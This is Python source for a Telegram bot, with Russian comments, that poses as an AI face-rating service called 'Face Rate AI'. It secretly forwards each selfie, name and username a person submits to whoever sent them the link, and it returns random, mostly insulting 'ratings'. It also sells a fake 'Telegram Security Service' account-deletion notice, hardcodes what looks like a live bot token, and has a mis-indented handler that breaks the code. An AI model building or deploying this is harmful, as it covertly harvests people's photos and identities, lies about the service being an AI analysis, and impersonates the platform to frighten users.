import telebot
from telebot.types import LabeledPrice, InlineKeyboardMarkup, InlineKeyboardButton
import random

# ТОКЕН БОТА (ВСТАВЬ СВОЙ)
TELEGRAM_TOKEN = "9037182564:AAF8t7WjlmrdSWmNsQV0nWxDkZM8LK-CwDc"

bot = telebot.TeleBot(TELEGRAM_TOKEN)

# Память для связей (кто кого пригласил)
victims = {}

@bot.message_handler(commands=['start'])
def start_message(message):
    command_parts = message.text.split()
    
    # 1. ПЕРЕХОД ПО ССЫЛКЕ НА БАН (ПЛАТНЫЙ ПРАНК)
    if len(command_parts) > 1 and command_parts[1] == "ban_prank":
        text = (
            "⚠️ **СЛУЖБА БЕЗОПАСНОСТИ TELEGRAM** ⚠️\n\n"
            "Внимание! Ваш аккаунт уличен в подозрительной активности.\n"
            "Нарушение: Использование фото, которые не проходят по стандартам Chad.\n\n"
            "❌ **Аккаунт будет удален завтра в 12:00.**\n\n"
            "(Шутка! Это пранк от твоего друга 😂)"
        )
        bot.send_message(message.chat.id, text, parse_mode="Markdown")
        return

    # 2. ПЕРЕХОД ПО ССЫЛКЕ НА ОЦЕНКУ (ЖЕРТВА)
    if len(command_parts) > 1:
        try:
            inviter_id = int(command_parts[1])
            victims[message.from_user.id] = inviter_id
            
            text = (
                "🤖 **Добро пожаловать в Face Rate AI!**\n\n"
                "Я — нейросеть, которая оценивает твое лицо по шкале от Sub 5 до Chad.\n\n"
                "📸 Скинь мне свое селфи, и я проведу анализ!"
            )
            bot.send_message(message.chat.id, text, parse_mode="Markdown")
        except ValueError:
            pass
    
    # 3. ЗАШЕЛ ЛЮБОЙ ЧЕЛОВЕК (СОЗДАТЕЛЬ ССЫЛКИ)
    else:
        bot_info = bot.get_me()
        invite_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
        
        text = (
            "😎 **Добро пожаловать в Face Rate AI!**\n\n"
            "Нажми на кнопку ниже, чтобы получить свою ссылку. "
            "Скинь её другу, и как только он скинет фото, оно прилетит **тебе** сюда!\n\n"
            "А если хочешь жестко проучить его — напиши /buy, чтобы купить пранк-снос аккаунта!"
        )
        
        # СОЗДАЕМ КНОПКУ
        markup = InlineKeyboardMarkup()
        btn = InlineKeyboardButton("🔗 Получить ссылку", url=invite_link)
        markup.add(btn)
        
        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

# Функция для покупки пранка (ПЛАТНЫЙ)
@bot.message_handler(commands=['buy'])
def buy_prank(message):
    bot.send_invoice(
        message.chat.id,
        title="Пранк: Снос аккаунта Telegram",
        description="Отправь другу фейковое уведомление о том, что его аккаунт удаляют.",
        invoice_payload="ban_prank_20",
        provider_token="", 
        currency="XTR", 
        prices=[LabeledPrice(label="Пранк-Снос", amount=20)]
    )

# БЕСПЛАТНАЯ ОЦЕНКА ЛИЦА
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    bot.send_message(message.chat.id, "📸 Фото получено! Нейросеть анализирует лицо... ⏳")
    
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        inviter_id = victims.get(message.from_user.id)
        
        # Отправляем фото тому, кто скинул ссылку
        if inviter_id:
            bot.send_photo(
                inviter_id, 
                downloaded_file, 
                caption=f"📸 **Жертва попалась!**\nИмя: {message.from_user.first_name}\nНик: @{message.from_user.username}"
            )
            
        ratings = ["SUB 5 😭", "SUB 5 😭", "SUB 5 😭", "NPC 😐", "HIGH TIER NORMIE 🤔", "CHAD 🗿"]
        result = random.choice(ratings)
        
        bot.reply_to(
            message, 
            f"🤖 Анализ завершен!\n\nТвой рейтинг: **{result}**\n\n"
            f"*(Хочешь так же проучить друга? Напиши /buy в боте!)*", 
            parse_mode="Markdown"
        )
        
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")
        @bot.pre_checkout_query_handler(func=lambda query: True)
    def checkout(pre_checkout_query):
        bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

# ВЫДАЧА ССЫЛКИ ПОСЛЕ ОПЛАТЫ
@bot.message_handler(content_types=['successful_payment'])
def got_payment(message):
    bot_info = bot.get_me()
    ban_link = f"https://t.me/{bot_info.username}?start=ban_prank"    
    # Ссылку на бан тоже сделаем кнопкой для удобства
    markup = InlineKeyboardMarkup()
    btn = InlineKeyboardButton("💀 Ссылка на снос", url=ban_link)
    markup.add(btn) 
    bot.send_message(
        message.chat.id, 
        f"💸 **Оплата 20 ⭐ прошла!**\n\n"
        f"Нажми на кнопку ниже, чтобы получить ссылку для сноса. "
        f"Кидай ее другу, и как только он перейдет, он обосрется! 😂", 
        reply_markup=markup,
        parse_mode="Markdown"
    )
@bot.message_handler(content_types=['text'])
def handle_text(message):
    bot.reply_to(message, "Скинь мне фотографию, чтобы я мог бесплатно оценить твое лицо! 📸")

print("Face Rate Bot запущен!")
bot.infinity_polling()
